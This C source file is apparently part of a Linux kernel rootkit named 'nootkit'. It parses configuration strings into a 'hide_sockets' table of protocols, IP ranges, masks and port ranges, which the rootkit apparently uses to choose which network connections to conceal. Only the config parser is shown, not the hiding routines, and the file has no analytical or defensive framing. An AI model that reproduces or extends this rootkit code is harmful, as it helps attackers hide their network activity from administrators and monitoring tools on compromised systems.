#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/printk.h>
#include <linux/byteorder/generic.h>

#include <config.h>

struct config_connection hide_sockets[MAX_HIDE_ENTITIES] = {0};

int config_parse_connection(char *cs, struct config_connection *res) {
    int local_ip_a = 0, local_ip_b = 0, local_ip_c = 0, local_ip_d = 0;
    int local_mask_a = 0, local_mask_b = 0, local_mask_c = 0, local_mask_d = 0;
    int foreign_ip_a = 0, foreign_ip_b = 0, foreign_ip_c = 0, foreign_ip_d = 0;
    int foreign_mask_a = 0, foreign_mask_b = 0, foreign_mask_c = 0, foreign_mask_d = 0;
    int local_port_start = 0, local_port_end = 0;
    int foreign_port_start = 0, foreign_port_end = 0;
    int proto = 0;
    int matches = 0;

    #define CONNECTION_STR_FIELDS 21
    matches = sscanf(cs,
        " "
        "PROTO = %d ; "
        "LOCAL = %d.%d.%d.%d / %d.%d.%d.%d : %d - %d ; "
        "FOREIGN = %d.%d.%d.%d / %d.%d.%d.%d : %d - %d ; ",
        &proto,
        &local_ip_a, &local_ip_b, &local_ip_c, &local_ip_d,
        &local_mask_a, &local_mask_b, &local_mask_c, &local_mask_d,
        &local_port_start, &local_port_end,
        &foreign_ip_a, &foreign_ip_b, &foreign_ip_c, &foreign_ip_d,
        &foreign_mask_a, &foreign_mask_b, &foreign_mask_c, &foreign_mask_d,
        &foreign_port_start, &foreign_port_end);

    if (matches != CONNECTION_STR_FIELDS) {
        printk(KERN_ERR "nootkit: Invalid connection string [%s], only %d fields matched",
            cs, matches);
        return 1;
    }

    res->proto = proto;
    res->local_ip = __cpu_to_be32(local_ip_d + (local_ip_c << 8) + (local_ip_b << 16) + (local_ip_a << 24));
    res->local_ip_mask = __cpu_to_be32(local_mask_d + (local_mask_c << 8) + (local_mask_b << 16) + (local_mask_a << 24));
    res->foreign_ip = __cpu_to_be32(foreign_ip_d + (foreign_ip_c << 8) + (foreign_ip_b << 16) + (foreign_ip_a << 24));
    res->foreign_ip_mask = __cpu_to_be32(foreign_mask_d + (foreign_mask_c << 8) + (foreign_mask_b << 16) + (foreign_mask_a << 24));
    res->local_port_start = __cpu_to_le16((u16)local_port_start);
    res->local_port_end = __cpu_to_le16((u16)local_port_end);
    res->foreign_port_start = __cpu_to_le16((u16)foreign_port_start);
    res->foreign_port_end = __cpu_to_le16((u16)foreign_port_end);

    return 0;
}

int config_parse_globals(void) {
    int i, ret;

    for (i = 0; i < hide_sockets_count; i++) {
        ret = config_parse_connection(hide_sockets_strs[i], &hide_sockets[i]);
        if (ret)
            return ret;
    }

    return 0;
}
